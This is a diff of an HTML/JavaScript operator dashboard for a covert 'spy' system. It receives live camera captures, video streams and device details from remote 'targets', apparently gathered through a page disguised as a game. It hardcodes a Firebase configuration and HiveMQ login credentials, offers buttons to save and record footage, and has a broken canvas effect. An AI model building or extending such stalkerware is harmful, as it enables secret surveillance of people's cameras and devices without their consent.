@@ -1,324 +1,437 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>🛡️ Game Analytics Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZenControl • Dashboard</title>
     <style>
-        body {
+        :root {
+            --hacker-green: #00ff41;
+            --matrix-bg: #0a0a0a;
+            --red-alert: #ff003c;
+        }
+        * {
             margin: 0;
-            background: #111;
-            color: #0af;
+            padding: 0;
+            box-sizing: border-box;
             font-family: 'Courier New', monospace;
+        }
+        body {
+            background: var(--matrix-bg);
+            color: var(--hacker-green);
+            min-height: 100vh;
             padding: 20px;
+            overflow-x: hidden;
         }
         .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid #0af;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-        .logo {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #0af;
-        }
-        .status {
-            background: #222;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-size: 0.9rem;
-        }
-        .online { color: #0f0; }
-        .offline { color: #f00; }
-        .container { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
-        .feed-container {
-            background: #000;
-            border: 2px solid #0af;
-            border-radius: 10px;
-            padding: 15px;
             text-align: center;
-        }
-        #remoteVideo {
-            width: 100%;
-            max-height: 500px;
-            border-radius: 5px;
-            background: #000;
-        }
-        .controls {
-            background: #1a1a1a;
             padding: 20px;
-            border-radius: 10px;
+            border-bottom: 2px solid var(--hacker-green);
+            margin-bottom: 30px;
+            position: relative;
         }
-        .btn {
-            background: #0af;
-            color: #000;
-            border: none;
-            padding: 12px 20px;
-            margin: 5px;
-            border-radius: 5px;
-            cursor: pointer;
+        .alert-banner {
+            background: var(--red-alert);
+            color: white;
+            padding: 10px;
+            text-align: center;
             font-weight: bold;
-            width: 100%;
+            animation: alertPulse 2s infinite;
+            margin-bottom: 20px;
+            border-radius: 5px;
         }
-        .btn:hover { background: #0cf; }
-        .btn.rec { background: #f00; }
-        .log {
-            background: #000;
-            border: 1px solid #333;
+        @keyframes alertPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+        }
+        .live-feed {
+            grid-column: span 2;
+        }
+        #spy-image {
+            width: 100%;
+            max-width: 800px;
+            border: 3px solid var(--red-alert);
+            border-radius: 10px;
+            margin: 15px 0;
+            background: black;
+            min-height: 400px;
+        }
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: statusPulse 2s infinite;
+        }
+        .online { background: var(--hacker-green); }
+        .offline { background: gray; }
+        @keyframes statusPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .log-container {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #444;
             border-radius: 5px;
             padding: 15px;
-            height: 300px;
+            max-height: 300px;
             overflow-y: auto;
-            font-size: 0.8rem;
-            margin-top: 20px;
+            margin-top: 10px;
         }
         .log-entry {
-            margin-bottom: 8px;
-            padding-bottom: 8px;
-            border-bottom: 1px dashed #333;
+            padding: 8px;
+            border-bottom: 1px solid #333;
+            font-size: 0.9rem;
         }
-        .target-list { margin-top: 20px; }
-        .target-item {
-            padding: 10px;
-            background: #222;
-            margin: 5px 0;
+        .log-entry.new {
+            background: rgba(0, 255, 65, 0.1);
+            border-left: 3px solid var(--hacker-green);
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        .control-btn {
+            background: rgba(255, 0, 60, 0.2);
+            color: white;
+            border: 1px solid var(--red-alert);
+            padding: 10px 20px;
             border-radius: 5px;
             cursor: pointer;
+            transition: all 0.3s;
         }
-        .target-item:hover { background: #333; }
+        .control-btn:hover {
+            background: var(--red-alert);
+            transform: translateY(-2px);
+        }
+        .matrix-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.1;
+            z-index: -1;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+            color: #666;
+            font-size: 0.8rem;
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
     </style>
 </head>
 <body>
+    <div class="matrix-effect" id="matrixCanvas"></div>
+    
+    <div class="alert-banner">
+        ⚠️ ZING-ZANG SURVEILLANCE SYSTEM - LIVE MONITORING ⚠️
+    </div>
+    
     <div class="header">
-        <div class="logo">ZENCONTROL DASHBOARD</div>
-        <div class="status" id="status">🔴 OFFLINE</div>
+        <h1>🛡️ <span class="blink">LIVE SPY DASHBOARD</span> 🛡️</h1>
+        <p>Real-time facial recognition feed</p>
     </div>
-
-    <div class="container">
-        <div class="feed-container">
-            <h3>📡 LIVE FEED - <span id="currentTarget">No target</span></h3>
-            <video id="remoteVideo" autoplay playsinline></video>
-            <div style="margin-top: 15px;">
-                <button class="btn rec" id="recBtn">● START RECORDING</button>
-                <button class="btn" id="snapBtn">📸 CAPTURE FRAME</button>
-                <button class="btn" id="audioBtn">🎤 TOGGLE AUDIO</button>
-                <button class="btn" id="disconnectBtn">⚠️ DISCONNECT</button>
+    
+    <div class="dashboard-grid">
+        <div class="card">
+            <h3>🎯 TARGET STATUS</h3>
+            <p><span class="status-indicator online" id="status-light"></span>
+               Status: <span id="target-status-text">MONITORING...</span></p>
+            <p>Last Capture: <span id="last-capture-time">--:--:--</span></p>
+            <p>Resolution: <span id="image-resolution">Unknown</span></p>
+            <p>FPS: <span id="fps-counter">0</span></p>
+        </div>
+        
+        <div class="card">
+            <h3>📊 SYSTEM INFO</h3>
+            <p>Total Captures: <span id="total-captures">0</span></p>
+            <p>Database: <span id="db-status">Connected</span></p>
+            <p>Uptime: <span id="uptime">00:00:00</span></p>
+            <p>Active Targets: <span id="active-targets">1</span></p>
+        </div>
+        
+        <div class="card live-feed">
+            <h3>📸 LIVE CAMERA FEED</h3>
+            <div style="text-align: center;">
+                <img id="spy-image" src="" alt="Live Feed" />
+                <p>Auto-refresh: <span id="refresh-rate">1.5s</span></p>
+                <div class="controls">
+                    <button class="control-btn" onclick="saveImage()">💾 SAVE IMAGE</button>
+                    <button class="control-btn" onclick="toggleRecording()">⏺️ RECORD VIDEO</button>
+                    <button class="control-btn" onclick="zoomIn()">🔍 ZOOM IN</button>
+                    <button class="control-btn" onclick="zoomOut()">🔎 ZOOM OUT</button>
+                </div>
             </div>
         </div>
-
-        <div class="controls">
-            <h3>⚙️ ACTIVE TARGETS</h3>
-            <div class="target-list" id="targetList">
-                <div class="target-item" style="color:#777">Waiting for connections...</div>
+        
+        <div class="card">
+            <h3>📝 LIVE LOGS</h3>
+            <div class="log-container" id="log-container">
+                <!-- Logs will appear here -->
             </div>
-            
-            <h3 style="margin-top:30px;">📊 LOGS</h3>
-            <div class="log" id="log">
-                <div class="log-entry">[<span id="time">00:00:00</span>] Dashboard initialized.</div>
+        </div>
+        
+        <div class="card">
+            <h3>📍 TARGET INFO</h3>
+            <div id="target-info">
+                Loading target information...
             </div>
         </div>
     </div>
+    
+    <div class="footer">
+        <p>🦹 ZING-ZANG Surveillance System v2.0 • Legal in ZING-ZANG Realm • All monitoring authorized</p>
+        <p class="blink">THIS IS A FUCKING SECURE CONNECTION 🔐</p>
+    </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.1/simplepeer.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
+    
     <script>
-        const remoteVideo = document.getElementById('remoteVideo');
-        const statusEl = document.getElementById('status');
-        const logEl = document.getElementById('log');
-        const targetList = document.getElementById('targetList');
-        const currentTargetEl = document.getElementById('currentTarget');
-        const recBtn = document.getElementById('recBtn');
-        const snapBtn = document.getElementById('snapBtn');
-        const audioBtn = document.getElementById('audioBtn');
-        const disconnectBtn = document.getElementById('disconnectBtn');
-
-        let peer = null;
-        let currentSessionId = null;
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let audioEnabled = true;
-        const activeTargets = new Map();
-
-        // HiveMQ Connection
-        const ws = new WebSocket('wss://aa3c606196d945bc89c194f94dc418b5.a1.au.hivema.cloud:8884/mqtt');
-
-        ws.onopen = () => {
-            log('Connected to HiveMQ Cloud');
-            statusEl.innerHTML = '🟢 HIVEMQ CONNECTED';
-            statusEl.className = 'status online';
-            
-            // Subscribe ke semua signal dari target
-            ws.send(JSON.stringify({
-                cmd: 'subscribe',
-                topics: ['spy/DASHBOARD/signal'],
-                username: 'Zang',
-                password: 'ZingZangRulez'
-            }));
+        // CONFIG FIREBASE SAMA KAYA TARGET 🔥
+        const firebaseConfig = {
+            apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
+            authDomain: "survei-f11a1.firebaseapp.com",
+            databaseURL: "https://survei-f11a1-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "survei-f11a1",
+            storageBucket: "survei-f11a1.firebasestorage.app",
+            messagingSenderId: "769641850914",
+            appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
         };
-
-        ws.onmessage = (event) => {
-            const msg = JSON.parse(event.data);
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        let lastImageTime = 0;
+        let captureCount = 0;
+        let isRecording = false;
+        let startTime = Date.now();
+        let zoomLevel = 1;
+        
+        // Matrix effect
+        function initMatrixEffect() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
             
-            if (msg.topic === 'spy/DASHBOARD/signal') {
-                const data = JSON.parse(msg.payload);
-                const { sessionId, signal } = data;
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const chars = "01";
+            const charArray = chars.split("");
+            const drops = [];
+            
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            
+            for(let i = 0; i < columns; i++) {
+                drops[i] = Math.random() * canvas.height;
+            }
+            
+            function drawMatrix() {
+                ctx.fillStyle = "rgba(0, 0, 0, 0.04)";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
                 
-                if (!activeTargets.has(sessionId)) {
-                    // New target detected
-                    addTarget(sessionId);
-                }
+                ctx.fillStyle = "#0F0";
+                ctx.font = `${fontSize}px monospace`;
                 
-                // Jika target ini sedang dipilih, process signal
-                if (sessionId === currentSessionId && peer) {
-                    peer.signal(signal);
-                }
-                
-                // Auto-connect ke target pertama jika belum ada koneksi
-                if (!currentSessionId && activeTargets.size === 1) {
-                    selectTarget(sessionId);
+                for(let i = 0; i < drops.length; i++) {
+                    const text = charArray[Math.floor(Math.random() * charArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
                 }
             }
-        };
-
-        function addTarget(sessionId) {
-            activeTargets.set(sessionId, { connected: false });
             
-            const targetItem = document.createElement('div');
-            targetItem.className = 'target-item';
-            targetItem.innerHTML = `📱 ${sessionId} <span style="float:right; color:#0f0">● LIVE</span>`;
-            targetItem.onclick = () => selectTarget(sessionId);
-            
-            targetList.appendChild(targetItem);
-            log(`New target detected: ${sessionId}`);
+            setInterval(drawMatrix, 35);
         }
-
-        function selectTarget(sessionId) {
-            if (peer) peer.destroy();
-            
-            currentSessionId = sessionId;
-            currentTargetEl.textContent = sessionId;
-            
-            // Update UI
-            document.querySelectorAll('.target-item').forEach(item => {
-                item.style.background = item.textContent.includes(sessionId) ? '#0af' : '#222';
-                item.style.color = item.textContent.includes(sessionId) ? '#000' : '#0af';
-            });
-            
-            // Create new peer connection
-            peer = new SimplePeer({
-                initiator: false,
-                config: {
-                    iceServers: [
-                        { urls: 'stun:stun.l.google.com:19302' },
-                        { urls: 'stun:global.stun.twilio.com:3478' }
-                    ]
+        
+        // Monitor live captures
+        function startMonitoring() {
+            // Listen for new captures
+            database.ref('spy_system/captures').limitToLast(1).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    const key = Object.keys(data)[0];
+                    const capture = data[key];
+                    
+                    // Update live feed
+                    document.getElementById('spy-image').src = capture.image;
+                    document.getElementById('last-capture-time').textContent = 
+                        new Date(capture.timestamp).toLocaleTimeString();
+                    document.getElementById('image-resolution').textContent = capture.size || 'Unknown';
+                    
+                    // Update counters
+                    captureCount++;
+                    document.getElementById('total-captures').textContent = captureCount;
+                    
+                    // Update FPS counter
+                    const now = Date.now();
+                    if (lastImageTime > 0) {
+                        const fps = Math.round(1000 / (now - lastImageTime));
+                        document.getElementById('fps-counter').textContent = fps;
+                    }
+                    lastImageTime = now;
+                    
+                    // Update status
+                    document.getElementById('target-status-text').innerHTML = 
+                        `<span style="color:#00ff41">LIVE 🔴</span>`;
+                    
+                    // Add to logs
+                    addLog(`📸 Capture received: ${capture.size}`, 'image');
                 }
             });
-
-            peer.on('signal', data => {
-                // Kirim balik ke target
-                ws.send(JSON.stringify({
-                    cmd: 'publish',
-                    topic: `spy/${sessionId}/signal`,
-                    payload: JSON.stringify(data),
-                    username: 'Zang',
-                    password: 'ZingZangRulez'
-                }));
-            });
-
-            peer.on('stream', stream => {
-                remoteVideo.srcObject = stream;
-                log(`Stream active from ${sessionId}`);
-                statusEl.innerHTML = `🎯 ${sessionId} - LIVE`;
-            });
-
-            peer.on('close', () => {
-                log(`Target ${sessionId} disconnected.`);
-                statusEl.innerHTML = '🔴 TARGET OFFLINE';
+            
+            // Monitor targets
+            database.ref('spy_system/targets').limitToLast(5).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    const targets = Object.values(data);
+                    const active = targets.filter(t => t.status === 'CONNECTED').length;
+                    document.getElementById('active-targets').textContent = active;
+                    
+                    // Update target info
+                    const latest = targets[targets.length - 1];
+                    if (latest) {
+                        document.getElementById('target-info').innerHTML = `
+                            <p>📱 Platform: ${latest.platform || 'Unknown'}</p>
+                            <p>🖥️ Screen: ${latest.screenRes || 'Unknown'}</p>
+                            <p>🔗 User Agent: ${latest.userAgent ? latest.userAgent.substring(0, 50) + '...' : 'Unknown'}</p>
+                            <p>⏰ Last Seen: ${new Date(latest.timestamp).toLocaleTimeString()}</p>
+                        `;
+                    }
+                }
             });
             
-            log(`Connecting to ${sessionId}...`);
+            // Monitor analytics
+            database.ref('spy_system/analytics').limitToLast(10).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    const analytics = Object.values(data);
+                    const latest = analytics[analytics.length - 1];
+                    if (latest) {
+                        addLog(`📊 Analytics: ${latest.timeSpent}s played`, 'analytics');
+                    }
+                }
+            });
         }
-
+        
+        // Log system
+        function addLog(message, type = 'info') {
+            const container = document.getElementById('log-container');
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry new`;
+            
+            const timestamp = new Date().toLocaleTimeString();
+            const icon = type === 'image' ? '📸' : type === 'analytics' ? '📊' : 'ℹ️';
+            
+            logEntry.innerHTML = `<strong>${timestamp}</strong> ${icon} ${message}`;
+            
+            container.prepend(logEntry);
+            
+            // Limit logs to 20 entries
+            const entries = container.getElementsByClassName('log-entry');
+            if (entries.length > 20) {
+                entries[entries.length - 1].remove();
+            }
+            
+            // Remove 'new' class after 3 seconds
+            setTimeout(() => {
+                logEntry.classList.remove('new');
+            }, 3000);
+        }
+        
         // Control functions
-        recBtn.onclick = () => {
-            if (!mediaRecorder) {
-                const stream = remoteVideo.srcObject;
-                if (!stream) return alert('No active stream');
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = `spy-record-${Date.now()}.webm`;
-                    a.click();
-                };
-                mediaRecorder.start();
-                recBtn.textContent = '⏹ STOP RECORDING';
-                log('Recording started.');
-            } else {
-                mediaRecorder.stop();
-                mediaRecorder = null;
-                recordedChunks = [];
-                recBtn.textContent = '● START RECORDING';
-                log('Recording saved.');
+        function saveImage() {
+            const img = document.getElementById('spy-image').src;
+            if (img) {
+                const link = document.createElement('a');
+                link.href = img;
+                link.download = `spy-capture-${Date.now()}.jpg`;
+                link.click();
+                addLog('💾 Image saved to device', 'info');
             }
-        };
-
-        snapBtn.onclick = () => {
-            const canvas = document.createElement('canvas');
-            canvas.width = remoteVideo.videoWidth;
-            canvas.height = remoteVideo.videoHeight;
-            canvas.getContext('2d').drawImage(remoteVideo, 0, 0);
-            const link = document.createElement('a');
-            link.download = `snap-${Date.now()}.png`;
-            link.href = canvas.toDataURL();
-            link.click();
-            log('Screenshot captured.');
-        };
-
-        audioBtn.onclick = () => {
-            if (remoteVideo.srcObject) {
-                const audioTracks = remoteVideo.srcObject.getAudioTracks();
-                audioTracks.forEach(track => {
-                    track.enabled = !track.enabled;
-                });
-                audioEnabled = !audioEnabled;
-                audioBtn.textContent = audioEnabled ? '🎤 AUDIO ON' : '🔇 AUDIO OFF';
-                log(`Audio ${audioEnabled ? 'enabled' : 'disabled'}`);
-            }
-        };
-
-        disconnectBtn.onclick = () => {
-            if (peer) {
-                peer.destroy();
-                peer = null;
-                remoteVideo.srcObject = null;
-                currentSessionId = null;
-                currentTargetEl.textContent = 'No target';
-                statusEl.innerHTML = '🟢 READY';
-                log('Disconnected from target.');
-            }
-        };
-
-        function log(text) {
-            const now = new Date();
-            const time = now.toTimeString().split(' ')[0];
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.innerHTML = `[${time}] ${text}`;
-            logEl.appendChild(entry);
-            logEl.scrollTop = logEl.scrollHeight;
         }
-
-        // Update time
-        setInterval(() => {
-            document.getElementById('time').textContent = new Date().toTimeString().split(' ')[0];
-        }, 1000);
+        
+        function toggleRecording() {
+            isRecording = !isRecording;
+            addLog(`⏺️ Recording ${isRecording ? 'STARTED' : 'STOPPED'}`, 'info');
+        }
+        
+        function zoomIn() {
+            zoomLevel += 0.2;
+            updateZoom();
+        }
+        
+        function zoomOut() {
+            zoomLevel = Math.max(0.5, zoomLevel - 0.2);
+            updateZoom();
+        }
+        
+        function updateZoom() {
+            const img = document.getElementById('spy-image');
+            img.style.transform = `scale(${zoomLevel})`;
+            addLog(`🔍 Zoom: ${zoomLevel.toFixed(1)}x`, 'info');
+        }
+        
+        // Uptime counter
+        function updateUptime() {
+            const elapsed = Date.now() - startTime;
+            const hours = Math.floor(elapsed / 3600000);
+            const minutes = Math.floor((elapsed % 3600000) / 60000);
+            const seconds = Math.floor((elapsed % 60000) / 1000);
+            
+            document.getElementById('uptime').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Initialize everything
+        window.onload = function() {
+            initMatrixEffect();
+            startMonitoring();
+            setInterval(updateUptime, 1000);
+            
+            // Initial log
+            addLog('🟢 Surveillance system initialized', 'info');
+            addLog('🔗 Connected to Firebase database', 'info');
+            addLog('🎯 Waiting for target connection...', 'info');
+        };
+        
+        // Handle window resize for matrix effect
+        window.addEventListener('resize', function() {
+            const canvas = document.getElementById('matrixCanvas');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
     </script>
 </body>
     </html>
